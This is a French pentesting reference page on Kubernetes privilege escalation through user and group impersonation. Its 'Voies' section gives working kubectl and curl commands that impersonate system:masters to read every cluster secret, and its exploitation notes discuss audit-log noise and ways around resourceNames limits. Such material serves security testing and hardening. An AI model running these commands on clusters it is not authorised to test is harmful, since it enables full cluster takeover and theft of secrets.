---
order: 3
title: "Usurpation d'identité : agir comme un autre utilisateur, groupe ou service account"
description: "Le verbe impersonate permet à une identité d'envoyer des requêtes en tant qu'un autre utilisateur, groupe ou service account via les en-têtes Impersonate-User et Impersonate-Group. Un attaquant qui en dispose usurpe l'identité d'un administrateur du cluster ou s'ajoute au groupe system:masters, obtenant toutes les permissions de cette identité sans modifier aucun binding."
keywords:
  - impersonate
  - impersonate-user
  - system:masters
  - rbac
  - escalade de privilèges
---

# Usurpation d'identité

Kubernetes permet d'agir pour le compte d'une autre identité : une requête portant les en-têtes `Impersonate-User`, `Impersonate-Group` ou `Impersonate-Uid` est évaluée comme cette identité, à condition que l'appelant détienne le verbe `impersonate` sur la ressource correspondante. C'est prévu pour les contrôleurs et l'outillage d'administration, mais entre les mains d'un attaquant c'est une escalade propre : usurper l'identité d'un administrateur de cluster connu, ou usurper l'appartenance au groupe `system:masters`, qui est câblé en dur sur l'accès total.

Vérifiez la permission :

```bash
kubectl auth can-i impersonate users
kubectl auth can-i impersonate groups
```

## Voies

```bash
# impersonate the system:masters group (bound to cluster-admin by default)
kubectl get secrets --all-namespaces --as=anything --as-group=system:masters
# impersonate a specific admin user
kubectl --as=admin@cluster get clusterrolebindings
# raw API: set the impersonation headers
curl -sk -H "Authorization: Bearer $T" \
  -H 'Impersonate-User: nobody' -H 'Impersonate-Group: system:masters' \
  $APISERVER/api/v1/secrets
```

Usurper le groupe `system:masters` est la forme la plus puissante : ce groupe contourne entièrement le RBAC grâce au binding `cluster-admin` intégré, de sorte que toute requête faite en l'usurpant réussit.

## Notes d'exploitation

- `impersonate` sur les `groups` est plus puissant que sur les `users`, car usurper `system:masters` accorde l'accès total quel que soit l'utilisateur auquel vous l'associez.
- L'usurpation laisse l'identité propre de l'appelant dans le journal d'audit à côté de celle usurpée, elle est donc plus bruyante qu'un binding ; elle ne nécessite cependant aucune modification d'objet, ce qui peut être un avantage.
- Le verbe est restreint : `impersonate` peut être limité à des noms d'utilisateur ou groupes spécifiques via `resourceNames` ; vérifiez quelles valeurs sont autorisées si une usurpation large est refusée.

## Références

- [Kubernetes: user impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)
- [Kubernetes: system:masters group](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#user-facing-roles)
- [HackTricks: Kubernetes impersonation](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
